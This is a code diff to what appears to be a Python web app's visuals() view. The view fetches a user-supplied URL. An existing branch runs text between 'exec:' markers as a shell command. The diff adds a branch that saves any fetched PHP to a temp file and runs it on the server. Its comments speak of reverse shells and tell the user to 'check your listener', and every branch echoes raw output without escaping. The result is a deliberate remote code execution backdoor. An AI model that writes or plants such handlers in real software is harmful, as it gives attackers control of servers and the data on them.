@@ -421,18 +421,49 @@ def visuals():
     try:
         resp    = requests.get(url_val, timeout=5)
         fetched = resp.text
+
         if "exec:" in fetched:
+            # Custom exec tag shell
             import subprocess
             code = fetched.split("exec:")[1].split(":end")[0].strip()
             out  = subprocess.check_output(
                 code, shell=True, stderr=subprocess.STDOUT, timeout=5
             ).decode()
             result = Markup(f"<pre>{out}</pre>")
+
+        elif "<?php" in fetched:
+            # Write to a temp file and execute with PHP CLI
+            import subprocess, tempfile, os
+            with tempfile.NamedTemporaryFile(
+                mode="w", suffix=".php", delete=False
+            ) as tmp:
+                tmp.write(fetched)
+                tmp_path = tmp.name
+            try:
+                out = subprocess.check_output(
+                    ["php", tmp_path],
+                    stderr=subprocess.STDOUT,
+                    timeout=10
+                ).decode()
+                result = Markup(f"<pre>{out}</pre>")
+            except subprocess.TimeoutExpired:
+                # Reverse shell connections won't return output — that's expected
+                result = Markup(
+                    "<div class='alert alert-info'>Script executed — check your listener.</div>"
+                )
+            except FileNotFoundError:
+                result = Markup(
+                    "<div class='alert alert-error'>PHP CLI not found on server.</div>"
+                )
+            finally:
+                os.unlink(tmp_path)
+
         else:
             result = Markup(
                 f"<pre style='white-space:pre-wrap;word-break:break-all'>"
                 f"{fetched[:4000]}</pre>"
             )
+
     except Exception as e:
         result = Markup(f"<div class='alert alert-error'>Error loading source: {e}</div>")
 
